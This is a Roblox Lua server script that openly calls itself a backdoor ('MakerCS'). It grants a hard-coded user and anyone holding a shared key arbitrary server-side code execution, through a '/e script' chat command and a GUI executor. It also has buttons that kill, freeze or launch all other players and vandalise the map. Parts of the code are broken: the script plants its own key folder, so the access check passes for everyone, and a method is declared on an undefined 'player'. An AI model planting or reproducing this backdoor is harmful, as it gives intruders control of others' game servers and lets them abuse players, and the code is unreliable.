-- MakerCS - Complete Backdoor System
-- Place this in ServerScriptService

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Chat = game:GetService("Chat")

-- ============ BACKDOOR SYSTEM ============
local Access = {
    "ThatOneScripter1234",  -- Your username
    -- Add more authorized users below
}

local ACCESS_KEY = "TeamMonster"

-- Function to check if player has access via key
local function hasKeyAccess(player)
    local keyFolder = ReplicatedStorage:FindFirstChild(ACCESS_KEY)
    if keyFolder then
        return true
    end
    if player.Name:find(ACCESS_KEY) then
        return true
    end
    return false
end

-- Function to check if player is authorized
local function isAuthorized(player)
    for i = 1, #Access do
        if player.Name == Access[i] then
            return true
        end
    end
    if hasKeyAccess(player) then
        return true
    end
    return false
end

-- Send notification to player
function player:SendNotification(message, title)
    title = title or "MakerCS"
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = message,
            Duration = 4
        })
    end)
end

-- Loadstring function with safety
local function loadstringSafe(code, env)
    local success, func = pcall(function()
        return loadstring(code)
    end)
    if success and func then
        if env then
            setfenv(func, env)
        end
        return func
    end
    return nil
end

-- Chat command handler
local function handleChat(message, player)
    local split = {}
    for word in message:gmatch("%S+") do
        table.insert(split, word)
    end
    
    if #split >= 1 and split[1]:lower() == "/e" then
        if #split >= 2 and split[2]:lower() == "script" then
            local scriptCode = message:sub(11)
            if scriptCode and scriptCode ~= "" then
                local env = setmetatable({owner = player}, {
                    __index = function(self, v)
                        return rawget(self, v) or getfenv()[v]
                    end,
                    __newindex = function(self, i, v)
                        getfenv()[i] = v
                    end,
                    __metatable = nil
                })
                local func = loadstringSafe(scriptCode, env)
                if func then
                    local success, err = pcall(func)
                    if not success then
                        player:SendNotification("❌ Script error: " .. tostring(err), "Backdoor")
                    else
                        player:SendNotification("✅ Script executed!", "Backdoor")
                    end
                else
                    player:SendNotification("❌ Failed to load script", "Backdoor")
                end
            end
        elseif #split >= 2 and split[2]:lower() == "key" then
            if #split >= 3 and split[3] == ACCESS_KEY then
                local keyFolder = Instance.new("Folder")
                keyFolder.Name = ACCESS_KEY
                keyFolder.Parent = ReplicatedStorage
                player:SendNotification("✅ Key accepted! You now have access.", "Backdoor")
            else
                player:SendNotification("❌ Invalid key! Access denied.", "Backdoor")
            end
        elseif #split >= 2 and split[2]:lower() == "help" then
            player:SendNotification("Commands:\n/e script [code] - Execute Lua\n/e key [key] - Verify key\n/e help - This menu", "Backdoor")
        end
    end
end

-- ============ SERVERSIDE FEATURES ============
-- Command cooldowns
local cooldowns = {}

local function onCooldown(player, command)
    local key = player.Name .. "_" .. command
    if cooldowns[key] and os.time() - cooldowns[key] < 3 then
        player:SendNotification("⚠️ Command on cooldown! Wait 3 seconds.", "MakerCS")
        return true
    end
    cooldowns[key] = os.time()
    return false
end

local function broadcastMessage(message)
    for _, player in pairs(Players:GetPlayers()) do
        player:SendNotification(message, "🌐 SERVER")
    end
end

-- Flood System
local floodActive = false
local floodParts = {}
local floodConnection = nil

local function toggleFlood()
    if floodActive then
        for _, part in pairs(floodParts) do
            pcall(function() part:Destroy() end)
        end
        floodParts = {}
        if floodConnection then floodConnection:Disconnect() end
        floodActive = false
        broadcastMessage("🌊 The flood has receded!")
        return
    end
    
    floodActive = true
    local waterLevel = -50
    
    for x = -250, 250, 50 do
        for z = -250, 250, 50 do
            local water = Instance.new("Part")
            water.Size = Vector3.new(50, 1, 50)
            water.Position = Vector3.new(x, waterLevel, z)
            water.Material = Enum.Material.Water
            water.Color = Color3.fromRGB(0, 100, 255)
            water.Transparency = 0.4
            water.Anchored = true
            water.CanCollide = false
            water.Name = "FloodWater"
            water.Parent = Workspace
            table.insert(floodParts, water)
        end
    end
    
    local targetLevel = 300
    local elapsed = 0
    
    floodConnection = RunService.Heartbeat:Connect(function(dt)
        if not floodActive then return end
        elapsed = elapsed + dt
        local t = math.min(elapsed / 25, 1)
        local currentLevel = waterLevel + (targetLevel - waterLevel) * t
        for _, water in pairs(floodParts) do
            if water and water.Parent then
                water.Position = Vector3.new(water.Position.X, currentLevel, water.Position.Z)
            end
        end
    end)
    broadcastMessage("🌊 A MASSIVE FLOOD is rising! Get to high ground!")
end

-- Map Effects
local function makeMapLava()
    for _, part in ipairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsA("Terrain") and part.Name ~= "HumanoidRootPart" then
            part.Material = Enum.Material.Neon
            part.Color = Color3.fromRGB(255, 50, 0)
        end
    end
    broadcastMessage("🔥 The ENTIRE MAP has turned into LAVA!")
end

local function freezeMap()
    for _, part in ipairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsA("Terrain") then
            part.Material = Enum.Material.Ice
            part.Color = Color3.fromRGB(100, 200, 255)
        end
    end
    broadcastMessage("❄️ The map has FROZEN OVER!")
end

-- Rainbow Map
local rainbowActive = false
local rainbowConnection = nil

local function toggleRainbowMap()
    rainbowActive = not rainbowActive
    if rainbowActive then
        rainbowConnection = RunService.Heartbeat:Connect(function()
            if not rainbowActive then return end
            local hue = tick() % 5 / 5
            for _, part in ipairs(Workspace:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Color = Color3.fromHSV(hue, 1, 1)
                end
            end
        end)
        broadcastMessage("🌈 The map is now RAINBOW colored!")
    else
        if rainbowConnection then rainbowConnection:Disconnect() end
        broadcastMessage("🌈 Rainbow mode disabled!")
    end
end

-- Player Controls
local function killAllPlayers(executor)
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= executor and target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.Health = 0
        end
    end
    broadcastMessage("💀 " .. executor.Name .. " killed ALL other players!")
end

local function launchAllPlayers(executor)
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= executor and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            target.Character.HumanoidRootPart.Velocity = Vector3.new(0, 500, 0)
        end
    end
    broadcastMessage("🚀 " .. executor.Name .. " launched ALL players into the air!")
end

local function freezeAllPlayers(executor)
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= executor and target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.WalkSpeed = 0
            target.Character.Humanoid.JumpPower = 0
        end
    end
    broadcastMessage("🛑 " .. executor.Name .. " froze ALL players!")
end

local function unfreezeAllPlayers()
    for _, target in pairs(Players:GetPlayers()) do
        if target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.WalkSpeed = 16
            target.Character.Humanoid.JumpPower = 50
        end
    end
    broadcastMessage("💨 All players unfrozen!")
end

-- Lighting Effects
local function blackout()
    Lighting.Brightness = 0
    Lighting.ClockTime = 0
    broadcastMessage("🌑 A BLACKOUT has occurred!")
end

local function restoreLighting()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.Ambient = Color3.fromRGB(127, 127, 127)
    broadcastMessage("☀️ Lighting has been restored!")
end

local function shockwave()
    local explosion = Instance.new("Explosion")
    explosion.Position = Vector3.new(0, 0, 0)
    explosion.BlastRadius = 500
    explosion.BlastPressure = 1000000
    explosion.Parent = Workspace
    broadcastMessage("💥 A MASSIVE SHOCKWAVE rocked the map!")
end

local function lightningStrike()
    for i = 1, 10 do
        local x = math.random(-200, 200)
        local z = math.random(-200, 200)
        local lightning = Instance.new("Part")
        lightning.Size = Vector3.new(2, 100, 2)
        lightning.Position = Vector3.new(x, 50, z)
        lightning.Material = Enum.Material.Neon
        lightning.Color = Color3.fromRGB(255, 255, 0)
        lightning.Anchored = true
        lightning.CanCollide = false
        lightning.Parent = Workspace
        
        local explosion = Instance.new("Explosion")
        explosion.Position = Vector3.new(x, 0, z)
        explosion.BlastRadius = 20
        explosion.Parent = Workspace
        
        task.wait(0.1)
        lightning:Destroy()
    end
    broadcastMessage("⚡ LIGHTNING STRIKES hit the map!")
end

-- ============ GUI SYSTEM ============
local function createGUI(player)
    if not isAuthorized(player) then return end
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "MakerCS"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 450, 0, 550)
    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = gui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,40)
    title.BackgroundColor3 = Color3.fromRGB(0,100,200)
    title.Text = "MakerCS [Backdoor]"
    title.TextColor3 = Color3.new(1,1,1)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)
    
    local userLabel = Instance.new("TextLabel")
    userLabel.Size = UDim2.new(1,0,0,20)
    userLabel.Position = UDim2.new(0,0,0,40)
    userLabel.BackgroundColor3 = Color3.fromRGB(0,70,140)
    userLabel.Text = "User: " .. player.Name
    userLabel.TextColor3 = Color3.new(1,1,0.5)
    userLabel.TextScaled = true
    userLabel.Font = Enum.Font.GothamBold
    userLabel.Parent = mainFrame
    
    -- Tabs
    local tabFrame = Instance.new("Frame")
    tabFrame.Size = UDim2.new(1,0,0,35)
    tabFrame.Position = UDim2.new(0,0,0,60)
    tabFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    tabFrame.Parent = mainFrame
    Instance.new("UICorner", tabFrame).CornerRadius = UDim.new(0, 8)
    
    local tabs = {
        {name = "SS Scripts", color = Color3.fromRGB(0,120,255)},
        {name = "Executor", color = Color3.fromRGB(40,40,40)},
        {name = "Commands", color = Color3.fromRGB(40,40,40)}
    }
    
    local tabButtons = {}
    local contentFrames = {}
    
    for i, tab in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.33, 0, 1, 0)
        btn.Position = UDim2.new((i-1) * 0.33, 0, 0, 0)
        btn.BackgroundColor3 = tab.color
        btn.Text = tab.name
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = tabFrame
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
        tabButtons[tab.name] = btn
        
        local content = Instance.new("ScrollingFrame")
        content.Size = UDim2.new(1,0,1,-95)
        content.Position = UDim2.new(0,0,0,95)
        content.BackgroundTransparency = 1
        content.Visible = (i == 1)
        content.CanvasSize = UDim2.new(0,0,0,0)
        content.ScrollBarThickness = 8
        content.Parent = mainFrame
        
        local layout = Instance.new("UIListLayout")
        layout.Parent = content
        layout.Padding = UDim.new(0, 10)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
        end)
        
        contentFrames[tab.name] = content
    end
    
    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0,30,0,30)
    minBtn.Position = UDim2.new(1,-35,0,5)
    minBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
    minBtn.Text = "✕"
    minBtn.TextColor3 = Color3.new(1,1,1)
    minBtn.TextScaled = true
    minBtn.Parent = mainFrame
    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
    
    local icon = Instance.new("TextButton")
    icon.Size = UDim2.new(0,60,0,60)
    icon.Position = UDim2.new(0.5,-30,0.2,0)
    icon.BackgroundColor3 = Color3.fromRGB(0,100,200)
    icon.Text = "⚙️"
    icon.TextColor3 = Color3.new(1,1,1)
    icon.TextScaled = true
    icon.Visible = false
    icon.Draggable = true
    icon.Parent = gui
    Instance.new("UICorner", icon).CornerRadius = UDim.new(0, 20)
    
    local function createButton(parent, text, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.95, 0, 0, 45)
        btn.BackgroundColor3 = color or Color3.fromRGB(40,40,40)
        btn.Text = text
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamSemibold
        btn.Parent = parent
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        btn.MouseButton1Click:Connect(callback)
        return btn
    end
    
    -- SS Scripts Tab
    local ssContent = contentFrames["SS Scripts"]
    
    createButton(ssContent, "🌊 Toggle Flood", function()
        if onCooldown(player, "Flood") then return end
        toggleFlood()
        player:SendNotification("Flood toggled!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "🔥 Make Map Lava", function()
        if onCooldown(player, "Lava") then return end
        makeMapLava()
        player:SendNotification("Map turned to lava!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "❄️ Freeze Map", function()
        if onCooldown(player, "Freeze") then return end
        freezeMap()
        player:SendNotification("Map frozen!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "🌈 Toggle Rainbow Map", function()
        if onCooldown(player, "Rainbow") then return end
        toggleRainbowMap()
        player:SendNotification("Rainbow toggled!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "💀 Kill All Players", function()
        if onCooldown(player, "Kill") then return end
        killAllPlayers(player)
        player:SendNotification("All players killed!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "🚀 Launch All Players", function()
        if onCooldown(player, "Launch") then return end
        launchAllPlayers(player)
        player:SendNotification("Players launched!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "🛑 Freeze All Players", function()
        if onCooldown(player, "FreezeP") then return end
        freezeAllPlayers(player)
        player:SendNotification("Players frozen!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "💨 Unfreeze Players", function()
        if onCooldown(player, "Unfreeze") then return end
        unfreezeAllPlayers()
        player:SendNotification("Players unfrozen!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "🌑 Blackout", function()
        if onCooldown(player, "Blackout") then return end
        blackout()
        player:SendNotification("Blackout enabled!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "☀️ Restore Lighting", function()
        if onCooldown(player, "Restore") then return end
        restoreLighting()
        player:SendNotification("Lighting restored!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "💥 Global Shockwave", function()
        if onCooldown(player, "Shockwave") then return end
        shockwave()
        player:SendNotification("Shockwave created!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    createButton(ssContent, "⚡ Lightning Strikes", function()
        if onCooldown(player, "Lightning") then return end
        lightningStrike()
        player:SendNotification("Lightning strikes!", "MakerCS")
    end, Color3.fromRGB(70,40,40))
    
    -- Executor Tab
    local execContent = contentFrames["Executor"]
    
    local execFrame = Instance.new("Frame")
    execFrame.Size = UDim2.new(0.95, 0, 0, 150)
    execFrame.BackgroundColor3 = Color3.fromRGB(30,30,40)
    execFrame.Parent = execContent
    Instance.new("UICorner", execFrame).CornerRadius = UDim.new(0, 8)
    
    local execTitle = Instance.new("TextLabel")
    execTitle.Size = UDim2.new(1,0,0,25)
    execTitle.BackgroundColor3 = Color3.fromRGB(100,50,50)
    execTitle.Text = "💀 SERVERSIDE SCRIPT EXECUTOR"
    execTitle.TextColor3 = Color3.new(1,1,1)
    execTitle.TextScaled = true
    execTitle.Font = Enum.Font.GothamBold
    execTitle.Parent = execFrame
    Instance.new("UICorner", execTitle).CornerRadius = UDim.new(0, 8)
    
    local scriptBox = Instance.new("TextBox")
    scriptBox.Size = UDim2.new(0.95, 0, 0, 70)
    scriptBox.Position = UDim2.new(0.025, 0, 0.25, 0)
    scriptBox.BackgroundColor3 = Color3.fromRGB(20,20,30)
    scriptBox.PlaceholderText = "Type serverside Lua script here...\nExample: game.Players:GetChildren()"
    scriptBox.Text = ""
    scriptBox.TextColor3 = Color3.new(100,255,100)
    scriptBox.TextScaled = true
    scriptBox.Font = Enum.Font.Code
    scriptBox.MultiLine = true
    scriptBox.Parent = execFrame
    Instance.new("UICorner", scriptBox).CornerRadius = UDim.new(0, 5)
    
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.45, 0, 0, 35)
    execBtn.Position = UDim2.new(0.025, 0, 0.75, 0)
    execBtn.BackgroundColor3 = Color3.fromRGB(150,0,0)
    execBtn.Text = "💀 EXECUTE"
    execBtn.TextColor3 = Color3.new(1,1,1)
    execBtn.TextScaled = true
    execBtn.Font = Enum.Font.GothamBold
    execBtn.Parent = execFrame
    Instance.new("UICorner", execBtn).CornerRadius = UDim.new(0, 5)
    
    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0.45, 0, 0, 35)
    clearBtn.Position = UDim2.new(0.525, 0, 0.75, 0)
    clearBtn.BackgroundColor3 = Color3.fromRGB(100,50,0)
    clearBtn.Text = "CLEAR"
    clearBtn.TextColor3 = Color3.new(1,1,1)
    clearBtn.TextScaled = true
    clearBtn.Font = Enum.Font.GothamBold
    clearBtn.Parent = execFrame
    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 5)
    
    execBtn.MouseButton1Click:Connect(function()
        local code = scriptBox.Text
        if code and code ~= "" then
            local success, err = pcall(function()
                local func = loadstring(code)
                if func then
                    func()
                else
                    error("Failed to compile")
                end
            end)
            if success then
                player:SendNotification("✅ Script executed!", "Executor")
                broadcastMessage("💀 " .. player.Name .. " executed a serverside script!")
            else
                player:SendNotification("❌ Error: " .. tostring(err), "Executor")
            end
        end
    end)
    
    clearBtn.MouseButton1Click:Connect(function()
        scriptBox.Text = ""
        player:SendNotification("Script cleared!", "Executor")
    end)
    
    -- Commands Tab
    local cmdContent = contentFrames["Commands"]
    
    local cmdHelp = Instance.new("TextLabel")
    cmdHelp.Size = UDim2.new(0.95, 0, 0, 200)
    cmdHelp.BackgroundColor3 = Color3.fromRGB(20,20,30)
    cmdHelp.Text = "📢 CHAT COMMANDS:\n\n/e script [code] - Execute Lua script\n/e key " .. ACCESS_KEY .. " - Get access\n/e help - Show this menu\n\nUse /e script for quick execution!\nExample: /e script print('Hello')"
    cmdHelp.TextColor3 = Color3.fromRGB(100,200,100)
    cmdHelp.TextScaled = true
    cmdHelp.Font = Enum.Font.GothamSemibold
    cmdHelp.TextXAlignment = Enum.TextXAlignment.Left
    cmdHelp.TextYAlignment = Enum.TextYAlignment.Top
    cmdHelp.Parent = cmdContent
    Instance.new("UICorner", cmdHelp).CornerRadius = UDim.new(0, 8)
    
    -- Tab switching
    for name, btn in pairs(tabButtons) do
        btn.MouseButton1Click:Connect(function()
            for _, content in pairs(contentFrames) do
                content.Visible = false
            end
            for _, tabBtn in pairs(tabButtons) do
                tabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
            end
            contentFrames[name].Visible = true
            btn.BackgroundColor3 = Color3.fromRGB(0,120,255)
        end)
    end
    
    minBtn.MouseButton1Click:Connect(function()
        mainFrame.Visible = false
        icon.Visible = true
    end)
    
    icon.MouseButton1Click:Connect(function()
        mainFrame.Visible = true
        icon.Visible = false
    end)
    
    player:SendNotification("🔑 MakerCS Loaded! You have full access!", "Welcome")
end

-- ============ INITIALIZATION ============
-- Setup backdoor for players
Players.PlayerAdded:Connect(function(player)
    task.wait(0.5)
    if isAuthorized(player) then
        createGUI(player)
        player:SendNotification("✅ Backdoor access granted! Use /e help for commands.", "Backdoor")
        player.Chatted:Connect(function(message)
            handleChat(message, player)
        end)
        
        -- Give special chat color
        pcall(function()
            local speaker = Chat:FindFirstChild(player.Name)
            if speaker then
                speaker:SetExtraData("NameColor", Color3.fromRGB(255, 100, 100))
                speaker:SetExtraData("ChatColor", Color3.fromRGB(255, 200, 200))
            end
        end)
    end
end)

-- Handle existing players
for _, player in pairs(Players:GetPlayers()) do
    task.spawn(function()
        if isAuthorized(player) then
            createGUI(player)
            player.Chatted:Connect(function(message)
                handleChat(message, player)
            end)
        end
    end)
end

-- Store access key in ReplicatedStorage
local keyFolder = Instance.new("Folder")
keyFolder.Name = ACCESS_KEY
keyFolder.Parent = ReplicatedStorage

print("========================================")
print("MakerCS Backdoor System Loaded!")
print("Authorized Users:")
for i = 1, #Access do
    print("  - " .. Access[i])
end
print("Access Key: " .. ACCESS_KEY)
print("========================================")